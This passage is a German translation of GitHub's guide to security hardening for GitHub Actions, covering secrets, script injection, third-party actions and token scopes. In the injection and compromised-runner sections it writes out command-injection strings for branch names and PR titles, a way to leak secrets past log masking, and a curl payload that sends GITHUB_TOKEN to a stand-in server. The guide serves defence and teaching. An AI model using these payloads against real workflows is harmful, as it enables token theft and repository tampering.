---
title: Sicherheitshärtung für GitHub Actions
shortTitle: Security hardening
intro: 'Best Practices zur Sicherheit bei der Verwendung von {% data variables.product.prodname_actions %}-Features'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
ms.openlocfilehash: 0f93496361500083c23ef6f5095a785855246503
ms.sourcegitcommit: b617c4a7a1e4bf2de3987a86e0eb217d7031490f
ms.translationtype: HT
ms.contentlocale: de-DE
ms.lasthandoff: 11/11/2022
ms.locfileid: '148161215'
---
{% data reusables.actions.enterprise-beta %} {% data reusables.actions.enterprise-github-hosted-runners %}

## Übersicht

In diesem Leitfaden wird erläutert, wie du die Sicherheitshärtung für bestimmte {% data variables.product.prodname_actions %}-Features konfigurierst. Wenn du noch nicht mit den Konzepten von {% data variables.product.prodname_actions %} vertraut bist, findest du unter [Core concepts for GitHub Actions](/actions/getting-started-with-github-actions/core-concepts-for-github-actions) („Wichtigste Konzepte für GitHub Actions“) weitere Informationen.

## Verwenden von Geheimnissen

Vertrauliche Werte sollten niemals als Klartext in Workflowdateien, sondern als Geheimnisse gespeichert werden. [Geheimnisse](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) können auf Organisations-, Repository- oder Umgebungsebene konfiguriert werden und ermöglichen das Speichern vertraulicher Informationen in {% data variables.product.product_name %}.

Damit die Geheimnisse verschlüsselt werden, bevor sie {% data variables.product.product_name %} erreichen, werden [versiegelte libsodium-Felder](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes) verwendet. Dieser Schritt erfolgt, wenn das Geheimnis über die [Benutzeroberfläche](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) oder über die [REST-API](/rest/reference/actions#secrets) übermittelt wird. Durch diese clientseitige Verschlüsselung lassen sich die Risiken im Zusammenhang mit der versehentlichen Protokollierung (z. B. Ausnahmeprotokolle und Anforderungsprotokolle) innerhalb der {% data variables.product.product_name %}-Infrastruktur minimieren. Sobald das Geheimnis hochgeladen wurde, ist {% data variables.product.product_name %} in der Lage, das Geheimnis zu entschlüsseln, damit es in die Workflowlaufzeit eingefügt werden kann.

Zum Verhindern einer versehentlichen Offenlegung verwendet {% data variables.product.product_name %} einen Mechanismus, der versucht, Geheimnisse zu bearbeiten, die in Ausführungsprotokollen erscheinen. Bei diesem Bearbeitungsschritt wird nach exakten Übereinstimmungen für konfigurierte Geheimnisse sowie nach gemeinsamen Codierungen der Werte (z. B. Base64) gesucht. Da es jedoch mehrere Möglichkeiten gibt, einen geheimen Wert zu transformieren, kann diese Bearbeitung nicht garantiert werden. Aus diesem Grund solltest du mithilfe bestimmter proaktiver Schritte und bewährter Methoden sicherstellen, dass Geheimnisse bearbeitetet werden und weitere Risiken im Zusammenhang mit Geheimnissen gemindert werden:

- **Verwende niemals strukturierte Daten als Geheimnis**
    - Bei strukturierten Daten können bei der Bearbeitung des Geheimnisses innerhalb von Protokollen Fehler auftreten. Der Grund dafür ist, dass die Bearbeitung weitgehend davon abhängig ist, dass eine exakte Übereinstimmung für den spezifischen geheimen Wert gefunden wird. Verwende z. B. kein JSON-, XML-, YAML- oder ein ähnliches Blob, um einen geheimen Wert zu kapseln, da die Wahrscheinlichkeit, dass die Geheimnisse ordnungsgemäß bearbeitet werden, dadurch erheblich sinkt. Erstelle stattdessen einzelne Geheimnisse für jeden vertraulichen Wert.
- **Registriere alle Geheimnisse, die in Workflows verwendet werden**
    - Wenn ein Geheimnis verwendet wird, um einen anderen vertraulichen Wert in einem Workflow zu generieren, sollte dieser generierte Wert formal [als geheim registriert](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) werden, damit er in Protokollen gegebenenfalls bearbeitet wird. Wenn du z. B. einen privaten Schlüssel zum Generieren eines signierten JWT für den Zugriff auf eine Web-API verwendest, musst du das JWT als Geheimnis registrieren. Anderenfalls wird das Token nicht bearbeitet, wenn es in einer Protokollausgabe erscheint.
    - Die Registrierung von Geheimnissen gilt auch für jegliche Art von Transformation/Codierung. Wenn dein Geheimnis transformiert wird (z. B. bei der Base64- oder URL-Codierung), musst du auch den neuen Wert als geheim registrieren.
- **Überprüfe, wie Geheimnisse verarbeitet werden**
    - Du solltest überprüfen, ob Geheimnisse wie erwartet verwendet werden. Überprüfe dazu im Quellcode des Repositorys, das den Workflow ausführt, alle Aktionen, die im Workflow verwendet werden. Stelle z. B. sicher, dass vertrauliche Informationen nicht an unbeabsichtigte Hosts gesendet werden oder explizit in der Protokollausgabe ausgegeben werden.
    - Sieh dir die Ausführungsprotokolle für deinen Workflow an, nachdem du gültige/ungültige Eingaben getestet hast, und überprüfe, ob Geheimnisse ordnungsgemäß bearbeitet bzw. nicht angezeigt werden. Es ist nicht immer offensichtlich, wie ein aufgerufener Befehl oder ein aufgerufenes Tool Fehler an `STDOUT` und `STDERR` sendet. So ist es möglich, dass Geheimnisse in Fehlerprotokollen erscheinen. Daher empfiehlt es sich, die Workflowprotokolle nach dem Testen gültiger und ungültiger Eingaben manuell zu überprüfen.
- **Verwende Anmeldeinformationen mit minimalen Berechtigungen**
    - Stelle sicher, dass die in Workflows verwendeten Anmeldeinformationen über den geringsten erforderlichen Umfang an Berechtigungen verfügen, und beachte, dass Benutzer*innen mit Schreibzugriff auf dein Repository auch über Lesezugriff auf alle Geheimnisse verfügen, die in deinem Repository konfiguriert sind. 
    - Aktionen können `GITHUB_TOKEN` verwenden, indem sie über den `github.token`-Kontext darauf zugreifen. Weitere Informationen findest du unter [Contexts](/actions/learn-github-actions/contexts#github-context) („Kontexte“). Aus diesem Grund solltest du sicherstellen, dass `GITHUB_TOKEN` die geringsten erforderlichen Berechtigungen erteilt werden. Es empfiehlt sich, als Standardberechtigung für `GITHUB_TOKEN` lediglich Lesezugriff auf Repositoryinhalte festzulegen. Die Berechtigungen können dann nach Bedarf für einzelne Aufträge in der Workflowdatei erhöht werden. Weitere Informationen findest du unter [Authentifizierung in einem Workflow](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token). 
- **Überprüfe und rotiere registrierte Geheimnisse**
    - Überprüfe die registrierten Geheimnisse regelmäßig, um sicherzustellen, dass sie noch erforderlich sind. Entferne Geheimnisse, die nicht mehr benötigt werden.
    - Rotiere Geheimnisse regelmäßig, um das Zeitfenster zu verringern, in dem ein kompromittiertes Geheimnis gültig ist.
- **Lege gegebenenfalls fest, dass beim Zugriff auf Geheimnisse eine Überprüfung erforderlich ist**
    - Du kannst festlegen, dass eine Genehmigung durch einen Prüfer erforderlich ist, um Umgebungsgeheimnisse zu schützen. So kann ein Workflowauftrag erst dann auf Umgebungsgeheimnisse zugreifen, nachdem ein Prüfer die entsprechende Genehmigung erteilt hat. Weitere Informationen zum Speichern von Geheimnissen in Umgebungen oder zum Festlegen von erforderlichen Überprüfungen für Umgebungen findest du unter [Encrypted secrets](/actions/reference/encrypted-secrets) („Verschlüsselte Geheimnisse“) und [Using environments for deployment](/actions/deployment/using-environments-for-deployment) („Verwenden von Umgebungen für die Bereitstellung“).

{% warning %}

**Warnung**: Alle Benutzer*innen mit Schreibzugriff auf dein Repository verfügen über Lesezugriff auf alle Geheimnisse, die in deinem Repository konfiguriert sind. Aus diesem Grund solltest du sicherstellen, dass die in Workflows verwendeten Anmeldeinformationen über die geringsten erforderlichen Berechtigungen verfügen.

{% endwarning %}

## Verwenden von `CODEOWNERS` zum Überwachen von Änderungen

Mithilfe des Features `CODEOWNERS` kannst du steuern, wie Änderungen an deinen Workflowdateien vorgenommen werden. Wenn alle deine Workflowdateien z. B. in `.github/workflows` gespeichert sind, kannst du dieses Verzeichnis der Codebesitzerliste hinzufügen, damit alle vorgeschlagenen Änderungen an diesen Dateien zuerst von einem benannten Prüfer genehmigt werden müssen.

Weitere Informationen findest du unter [About code owners](/github/creating-cloning-and-archiving-repositories/about-code-owners) („Informationen zu Codebesitzern“).

## Informationen zum Risiko der Skripteinschleusung

Beim Erstellen von Workflows, [benutzerdefinierten Aktionen](/actions/creating-actions/about-actions) und [zusammengesetzten Aktionen](/actions/creating-actions/creating-a-composite-action) solltest du immer überprüfen, ob dein Code gegebenenfalls nicht vertrauenswürdige Eingaben von Angreifer*innen ausführen kann. Dies kann passieren, wenn Angreifer*innen bösartige Befehle und Skripts zu einem Kontext hinzufügen. Bei der Ausführung deines Workflows werden diese Zeichenfolgen möglicherweise als Code interpretiert, der dann im Runner ausgeführt wird.

 Angreifer*innen können dem [`github`-Kontext](/actions/reference/context-and-expression-syntax-for-github-actions#github-context) eigene bösartige Inhalte hinzufügen, die als potenziell nicht vertrauenswürdige Eingaben behandelt werden sollten. Diese Kontexte enden üblicherweise auf `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref` und `title`.  Beispiel: `github.event.issue.title` oder `github.event.pull_request.body`

 Du solltest sicherstellen, dass diese Werte nicht direkt in Workflows, Aktionen, API-Aufrufen oder an anderen Stellen eingefügt werden, an denen sie als ausführbarer Code interpretiert werden können. Indem du denselben defensiven Programmieransatz wie bei anderem privilegiertem Anwendungscode verwendest, kannst du zur Sicherheitshärtung bei der Verwendung von {% data variables.product.prodname_actions %} beitragen. Informationen zu möglichen Schritten, die Angreifer*innen ausführen können, findest du unter [Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner) („Potenzielle Auswirkungen eines kompromittierten Runners“).

Darüber hinaus gibt es weitere weniger offensichtliche Quellen für potenziell nicht vertrauenswürdige Eingaben. Dazu zählen z. B. Verzweigungsnamen und E-Mail-Adressen, die in Bezug auf ihre zulässigen Inhalte ziemlich flexibel sein können. `zzz";echo${IFS}"hello";#` ist beispielsweise ein zulässiger Verzweigungsname, der ein möglicher Angriffsvektor für ein Zielrepository wäre.

In den folgenden Abschnitten wird erläutert, wie du das Risiko der Skripteinschleusung verringern kannst.

### Beispiel für einen Angriff durch Skripteinschleusung

Ein Angriff durch Skripteinschleusung kann direkt innerhalb des Inlineskripts eines Workflows auftreten. Im folgenden Beispiel verwendet eine Aktion einen Ausdruck, um die Gültigkeit eines Pull Request-Titels zu testen. Dies geht jedoch mit dem Risiko der Skripteinschleusung einher:

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

Bei diesem Beispiel besteht das Risiko der Skripteinschleusung, da der Befehl `run` innerhalb eines temporären Shellskripts im Runner ausgeführt wird. Vor der Ausführung des Shellskripts werden die Ausdrücke innerhalb von {% raw %}`${{ }}`{% endraw %} ausgewertet und anschließend durch die resultierenden Werte ersetzt. Bei diesem Vorgang besteht die Möglichkeit, dass Shellbefehle eingeschleust werden.

Angreifer*innen könnten einen Pull Request mit dem Titel `a"; ls $GITHUB_WORKSPACE"` erstellen, um Befehle in diesem Workflow einzuschleusen:

![Beispiel für die Skripteinschleusung im Titel eines Pull Requests](/assets/images/help/images/example-script-injection-pr-title.png)

In diesem Beispiel wird die {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %}-Anweisung mithilfe des Zeichens `"` unterbrochen, damit der Befehl `ls` im Runner ausgeführt werden kann. Die Ausgabe des Befehls `ls` erscheint im Protokoll:

![Beispiel für das Ergebnis einer Skripteinschleusung](/assets/images/help/images/example-script-injection-result.png)

## Bewährte Methoden zum Verhindern von Angriffen durch Skripteinschleusung

Es gibt verschiedene Ansätze, um das Risiko der Skripteinschleusung zu verhindern:

### Verwenden einer Aktion anstelle eines Inlineskripts (empfohlen)

Bei dieser empfohlenen Vorgehensweise erstellst du eine Aktion, die den Kontextwert als Argument verarbeitet. Da der Kontextwert bei diesem Ansatz nicht zum Generieren eines Shellskripts verwendet wird, sondern stattdessen als Argument an die Aktion übergeben wird, wird das Risiko der Skripteinschleusung minimiert:

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### Verwenden einer Zwischenumgebungsvariable

Bei Inlineskripts sollte der Wert des Ausdrucks auf eine Zwischenumgebungsvariable festgelegt werden, um nicht vertrauenswürdige Eingaben zu verhindern.

Im folgenden Beispiel wird Bash verwendet, um den `github.event.pull_request.title`-Wert als Umgebungsvariable zu verarbeiten:

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

In diesem Beispiel ist der Versuch der Skripteinschleusung nicht erfolgreich:

![Beispiel für eine nicht erfolgreiche Skripteinschleusung](/assets/images/help/images/example-script-injection-mitigated.png)

Bei dieser Vorgehensweise wird der Wert des {% raw %}`${{ github.event.issue.title }}`{% endraw %}-Ausdrucks im Arbeitsspeicher gespeichert und als Variable verwendet. Es findet keine Interaktion mit dem Skriptgenerierungsprozess statt. Darüber hinaus solltest du gegebenenfalls Shellvariablen mit doppelten Anführungszeichen verwenden, um eine [Wortteilung](https://github.com/koalaman/shellcheck/wiki/SC2086) zu vermeiden. Dies ist jedoch [eine der vielen](https://mywiki.wooledge.org/BashPitfalls) allgemeinen Empfehlungen zum Schreiben von Shellskripts, die nicht speziell für {% data variables.product.prodname_actions %} gilt.

{% ifversion fpt or ghec %}
### Verwenden von Startworkflows für die Codeüberprüfung

Die {% data reusables.advanced-security.starter-workflows-beta %} {% data variables.product.prodname_code_scanning_capc %} ermöglicht die Ermittlung von Sicherheitsrisiken, bevor Code in einer Produktionsumgebung verwendet wird. {% data variables.product.product_name %} bietet Startworkflows für die {% data variables.product.prodname_code_scanning %}. Du kannst diese vorgeschlagenen Workflows zum Erstellen von Workflows zur {% data variables.product.prodname_code_scanning %} verwenden. So musst du die Workflows nicht von Grund auf neu erstellen. Der Workflow von {% data variables.product.company_short%}, der {% data variables.code-scanning.codeql_workflow %}, basiert auf {% data variables.product.prodname_codeql %}. Es stehen auch Startworkflows von Drittanbietern zur Verfügung.

Weitere Informationen findest du unter [About {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning) („Informationen zur Codeüberprüfung“) und [Setting up {% data variables.product.prodname_code_scanning %} using starter workflows](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows) („Einrichten der Codeüberprüfung mithilfe von Startworkflows“).

{% endif %}

### Einschränken von Berechtigungen für Token

Du solltest die zugewiesenen Berechtigungen einschränken, um das Risiko offengelegter Token zu mindern. Weitere Informationen findest du unter [Modifying the permissions for the GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token) („Ändern der Berechtigungen für GITHUB_TOKEN“).

{% ifversion fpt or ghec or ghes > 3.4 %}

## Verwenden von OpenID Connect für den Zugriff auf Cloudressourcen

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## Verwenden von Drittanbieteraktionen

Die einzelnen Aufträge in einem Workflow können mit anderen Aufträgen interagieren (und diese kompromittieren). Beispiel: Ein Auftrag, der die von einem späteren Auftrag verwendeten Umgebungsvariablen abfragt, Dateien in ein freigegebenes Verzeichnis schreibt, das von einem späteren Auftrag verarbeitet wird, oder sogar direkt mit dem Docker-Socket interagiert, andere ausgeführte Container überprüft und Befehle in diesen Containern ausführt.

Eine einzelne kompromittierte Aktion in einem Workflow kann also große Auswirkungen haben, da diese kompromittierte Aktion Zugriff auf alle Geheimnisse hat, die in deinem Repository konfiguriert sind. Außerdem kann diese Aktion gegebenenfalls `GITHUB_TOKEN` verwenden, um Inhalte in das Repository zu schreiben. Folglich besteht ein erhebliches Risiko, wenn Aktionen aus Drittanbieterrepositorys in {% data variables.product.prodname_dotcom %} ausgeführt werden. Informationen zu möglichen Schritten, die Angreifer*innen ausführen können, findest du unter [Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner) („Potenzielle Auswirkungen eines kompromittierten Runners“).

Du kannst dieses Risiko verringern, indem du die folgenden bewährten Methoden anwendest:

* **Hefte Aktionen an einen Commit-SHA voller Länge an**

  Das Anheften einer Aktion an einen Commit-SHA voller Länge ist derzeit die einzige Möglichkeit, eine Aktion als unveränderliche Version zu verwenden. Durch das Anheften an einen bestimmten SHA wird das Risiko von Angriffen verringert, bei denen eine Hintertür zum Repository der Aktion hinzugefügt wird. Der Grund dafür ist, dass in diesem Fall eine SHA-1-Kollision für eine gültige Git-Objektpayload generiert werden müsste.

* **Überprüfe den Quellcode der Aktion**

  Stelle sicher, dass die Aktion den Inhalt deines Repositorys und deine Geheimnisse wie erwartet verarbeitet. Überprüfe beispielsweise, ob Geheimnisse nicht an unbeabsichtigte Hosts gesendet oder nicht versehentlich protokolliert werden.

* **Hefte Aktionen nur dann an Tags, wenn du den Ersteller als vertrauenswürdig einstufst**

  Wenngleich das Anheften an einen Commit-SHA die sicherste Möglichkeit ist, ist das Angeben eines Tags unkomplizierter und eine weitverbreitete Vorgehensweise. Wenn du ein Tag angeben möchtest, stelle sicher, dass du den Erstellern der Aktion vertraust. Der Badge für überprüfte Ersteller in {% data variables.product.prodname_marketplace %} zeigt an, dass die Aktion von einem Team erstellt wurde, dessen Identität von {% data variables.product.prodname_dotcom %} überprüft und bestätigt wurde. Beachte, dass diese Vorgehensweise auch dann ein Risiko birgt, wenn der oder die Ersteller*in als vertrauenswürdig eingestuft wird. Der Grund dafür ist, dass ein Tag verschoben oder gelöscht werden kann, wenn ein*e böswillige*r Akteur*in Zugriff auf das Repository erhält, in dem die Aktion gespeichert ist.

{% ifversion fpt or ghes > 3.3 or ghae > 3.3 or ghec %}
## Wiederverwenden von Drittanbieterworkflows

Die oben beschriebenen Grundsätze für die Verwendung von Drittanbieteraktionen gelten auch für die Verwendung von Drittanbieterworkflows. Wende die oben beschriebenen bewährten Methoden auch bei Workflows an, um die Risiken bei der Wiederverwendung von Workflows zu verringern. Weitere Informationen findest du unter [Reusing workflows](/actions/learn-github-actions/reusing-workflows) („Wiederverwenden von Workflows“).
{% endif %}

{% ifversion internal-actions %}
## Hinzufügen von Workflows für den Zugriff auf interne Repositorys

{% data reusables.actions.outside-collaborators-internal-actions %} Weitere Informationen findest du unter [Sharing actions and workflows with your enterprise](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise) („Freigeben von Aktionen und Workflows für dein Unternehmen“).
{% endif %}

{% ifversion allow-actions-to-approve-pr %}
## Hindern von {% data variables.product.prodname_actions %} am {% ifversion allow-actions-to-approve-pr-with-ent-repo %}Erstellen oder {% endif %}Genehmigen von Pull Requests

{% data reusables.actions.workflow-pr-approval-permissions-intro %} Wenn du Workflows oder anderen Automatisierungen erlaubst, {% ifversion allow-actions-to-approve-pr-with-ent-repo %} Pull Requests zu erstellen oder {% endif %}zu genehmigen, kann dies ein Sicherheitsrisiko darstellen, falls der Pull Request ohne angemessene Aufsicht gemergt wird.

Weitere Informationen zum Konfigurieren dieser Einstellung findest du unter {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}[Erzwingen von Richtlinien für {% data variables.product.prodname_actions %} in deinem Unternehmen](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests),{% endif %}{% endif %} [Deaktivieren oder Begrenzen von {% data variables.product.prodname_actions %} für deine Organisation](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests){% ifversion allow-actions-to-approve-pr-with-ent-repo %} und [Verwalten von {% data variables.product.prodname_actions %}-Einstellungen für ein Repository](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests){% endif %}.
{% endif %}

## Verwenden von OpenSSF-Scorecards, um Workflows zu schützen

[Scorecards](https://github.com/ossf/scorecard) sind ein automatisiertes Sicherheitstool, mit dem Lieferkettenaktionen gekennzeichnet werden, die ein Risiko bergen. Du kannst die [Scorecards-Aktion](https://github.com/marketplace/actions/ossf-scorecard-action) und den [Startworkflow](https://github.com/actions/starter-workflows) verwenden, um bewährte Sicherheitsmethoden anzuwenden. Nach der Konfiguration wird die Scorecards-Aktion bei Repositoryänderungen automatisch ausgeführt, und Entwickler*innen werden mithilfe der integrierten Codeüberprüfung über riskante Lieferkettenaktionen informiert. Das Scorecards-Projekt führt eine Reihe von Prüfungen aus, mit denen u. a. Angriffe durch Skripteinschleusung, Tokenberechtigungen und angeheftete Aktionen ermittelt bzw. untersucht werden.

## Potenzielle Auswirkungen eines kompromittierten Runners

In diesen Abschnitten werden einige Schritte beschrieben, die Angreifer*innen ausführen können, wenn sie böswillige Befehle in einem {% data variables.product.prodname_actions %}-Runner ausführen können.

{% note %}

**Hinweis:** Von {% data variables.product.prodname_dotcom %} gehostete Runner führen keine Scans nach schädlichem Code (z. B. einer kompromittierten Drittanbieterbibliothek) durch, der während des Auftrags von Benutzer*innen heruntergeladen wurde.

{% endnote %}

### Zugreifen auf Geheimnisse

Workflows, die mit dem `pull_request`-Ereignis ausgelöst werden, verfügen ausschließlich über Leseberechtigungen und haben keinen Zugriff auf Geheimnisse. Diese Berechtigungen variieren jedoch für verschiedene Ereignisauslöser wie `issue_comment`, `issues` und `push`, bei denen Angreifer*innen versuchen könnten, Repositorygeheimnisse auszuspähen oder die Schreibberechtigung des [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token) eines Auftrags zu verwenden.

- Wenn das Geheimnis oder Token auf eine Umgebungsvariable festgelegt ist, kann mithilfe von `printenv` direkt über die Umgebung darauf zugegriffen werden.
- Wird das Geheimnis direkt in einem Ausdruck verwendet, wird das generierte Shellskript auf dem Datenträger gespeichert, und es kann darauf zugegriffen werden.
- Bei benutzerdefinierten Aktionen kann das Risiko abhängig davon variieren, wie ein Programm das Geheimnis nutzt, das aus dem Argument abgerufen wurde:

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

Wenngleich {% data variables.product.prodname_actions %} ein Scrubbing für Geheimnisse aus dem Arbeitsspeicher ausführt, auf die nicht im Workflow verwiesen wird bzw. die nicht in einer Aktion enthalten sind, können `GITHUB_TOKEN` und Geheimnisse, auf die verwiesen wird, von Angreifer*innen ausgespäht werden.

### Exfiltrieren von Daten aus einem Runner

Angreifer*innen können sämtliche gestohlenen Geheimnisse oder andere Daten aus dem Runner exfiltrieren. Damit die versehentliche Offenlegung von Geheimnissen verhindert wird, führt {% data variables.product.prodname_actions %} eine [automatische Bearbeitung von Geheimnissen durch, die im Protokoll ausgegeben werden](/actions/reference/encrypted-secrets#accessing-your-secrets). Dies ist jedoch kein wirklicher Schutz, da die Geheimnisse absichtlich an das Protokoll gesendet werden können. So können verschleierte Geheimnisse beispielweise mithilfe von `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};` exfiltriert werden. Und da Angreifer*innen auch beliebige Befehle ausführen können, können sie Geheimnisse oder andere Repositorydaten mithilfe von HTTP-Anforderungen an einen externen Server senden.

### Diebstahl des `GITHUB_TOKEN` eines Auftrags

Es ist möglich, dass Angreifer*innen das `GITHUB_TOKEN` eines Auftrags stehlen. Der {% data variables.product.prodname_actions %}-Runner empfängt automatisch ein generiertes `GITHUB_TOKEN` mit Berechtigungen, die auf das Repository beschränkt sind, das den Workflow enthält. Nachdem der Auftrag abgeschlossen wurde, verliert das Token seine Gültigkeit. Das abgelaufene Token bietet keinen Nutzen für Angreifer*innen. Zur Umgehung dieser Einschränkung kann der Angriff automatisiert und in Sekundenbruchteilen ausgeführt werden, indem ein vom Angreifer oder von der Angreiferin gesteuerter Server mit dem Token aufgerufen wird. Beispiel: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.

### Ändern der Repositoryinhalte

Der Angreiferserver kann die {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %}-API verwenden, um [Repositoryinhalte zu ändern](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token). Dies umfasst auch die Versionen, wenn die zugewiesenen Berechtigungen von `GITHUB_TOKEN`[nicht eingeschränkt sind](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

## Grundlegendes zum repositoryübergreifenden Zugriff

Die Berechtigungen von {% data variables.product.prodname_actions %} sind bewusst für nur jeweils ein Repository ausgelegt. Mit `GITHUB_TOKEN` wird die gleiche Zugriffsstufe erteilt wie die von Benutzer*innen mit Schreibzugriff. Denn alle Benutzer*innen mit Schreibzugriff können auf dieses Token zugreifen, indem du eine Workflowdatei erstellst oder änderst und dabei die Berechtigungen von `GITHUB_TOKEN` bei Bedarf erhöhst. Benutzer*innen verfügen über spezifische Berechtigungen für die einzelnen Repositorys. Wenn das `GITHUB_TOKEN` für ein Repository Zugriff auf ein anderes Repository ermöglichen würde, könnte sich dies bei nicht sorgfältiger Implementierung daher auf das {% data variables.product.prodname_dotcom %}-Berechtigungsmodell auswirken. Gleichermaßen ist Vorsicht geboten, wenn {% data variables.product.prodname_dotcom %}-Authentifizierungstoken zu einem Workflow hinzugefügt werden. Denn auch dies kann sich auf das {% data variables.product.prodname_dotcom %}-Berechtigungsmodell auswirken, wenn Projektmitarbeiter*innen unbeabsichtigterweise umfangreiche Zugriffsberechtigungen zugewiesen werden.

Wir verfügen über [einen Plan in der {% data variables.product.prodname_dotcom %}-Roadmap](https://github.com/github/roadmap/issues/74) zur Unterstützung eines Flows, der einen repositoryübergreifenden Zugriff innerhalb von {% data variables.product.product_name %} ermöglicht. Dies ist jedoch noch kein unterstütztes Feature. Derzeit besteht die einzige Möglichkeit für privilegierte repositoryübergreifende Interaktionen darin, ein {% data variables.product.prodname_dotcom %}-Authentifizierungstoken oder einen SSH-Schlüssel als Geheimnis innerhalb des Workflows einzusetzen. Da viele Authentifizierungstokentypen keinen differenzierten Zugriff auf bestimmte Ressourcen ermöglichen, besteht ein erhebliches Risiko durch die Verwendung des falschen Tokentyps, mit dem gegebenenfalls wesentlich umfangreichere Zugriffsberechtigungen zugewiesen werden als beabsichtigt.

In dieser Liste sind die empfohlenen Vorgehensweisen für den Zugriff auf Repositorydaten innerhalb eines Workflows in absteigender Präferenzreihenfolge aufgeführt:

1. **`GITHUB_TOKEN`**
    -  Dieses Token ist bewusst auf das eine Repository beschränkt, das den Workflow aufgerufen hat, und kann dieselbe Zugriffsstufe wie Benutzer*innen mit Schreibzugriff auf das Repository aufweisen. Das Token wird erstellt, bevor die einzelnen Aufträge beginnen, und läuft ab, wenn ein Auftrag abgeschlossen ist. Weitere Informationen findest du unter [Authenticating with the GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token) („Authentifizieren mit dem GITHUB_TOKEN“).
    - `GITHUB_TOKEN` sollte wann immer möglich verwendet werden.
2. **Bereitstellungsschlüssel für Repositorys**
    - Bereitstellungsschlüssel sind einer der einzigen Anmeldeinformationstypen, die Lese- oder Schreibzugriff auf ein einzelnes Repository gewähren. Diese Schlüssel können für die Interaktion mit einem anderen Repository innerhalb eines Workflows verwendet werden. Weitere Informationen findest du unter [Managing deploy keys](/developers/overview/managing-deploy-keys#deploy-keys) („Verwalten von Bereitstellungsschlüsseln“).
    - Beachte, dass Bereitstellungsschlüssel nur mit Git im Repository geklont bzw. an das Repository gepusht und nicht für die Interaktion mit der REST- oder GraphQL-API verwendet werden können. Aus diesem Grund eignen sie sich möglicherweise nicht für deine Anforderungen.
3. **{% data variables.product.prodname_github_app %}-Token**
    - {% data variables.product.prodname_github_apps %} kann in ausgewählten Repositorys installiert werden, und es können sogar differenzierte Berechtigungen für die Ressourcen innerhalb dieser Repositorys zugewiesen werden. Du kannst eine interne {% data variables.product.prodname_github_app %} für deine Organisation erstellen, diese in den Repositorys installieren, auf die du in deinem Workflow zugreifen musst, und sich als die Installation innerhalb deines Workflows authentifizieren, um auf diese Repositorys zuzugreifen.
4. **{% data variables.product.pat_generic %}**
    - Du solltest niemals ein {% data variables.product.pat_v1 %} verwenden. Diese Token gewähren Zugriff auf alle Repositorys innerhalb der Organisationen, auf die du Zugriff hast, sowie auf alle persönlichen Repositorys in deinem persönlichen Konto. Dadurch werden indirekt umfangreiche Zugriffsberechtigungen für alle Schreibzugriffsbenutzer*innen des Repositorys gewährt, in dem sich der Workflow befindet.
    - Wenn du ein {% data variables.product.pat_generic %} verwendest, solltest du niemals ein {% data variables.product.pat_generic %} deines eigenen Kontos verwenden. Wenn du eine Organisation zu einem späteren Zeitpunkt verlässt, treten bei Workflows mit diesem Token umgehend Probleme auf, und das Debuggen kann schwierig sein. Stattdessen solltest du ein {% ifversion pat-v2%}{% data variables.product.pat_v2 %}{% else %}{% data variables.product.pat_generic %}{% endif %} eines neuen Kontos verwenden, das deiner Organisation gehört und dem nur Zugriff auf die Repositorys erteilt wird, die für diesen Workflow benötigt werden. Beachte, dass dieser Ansatz nicht skalierbar ist und stattdessen Alternativen wie Bereitstellungsschlüssel bevorzugt werden sollten.
5. **SSH-Schlüssel für ein persönliches Konto**
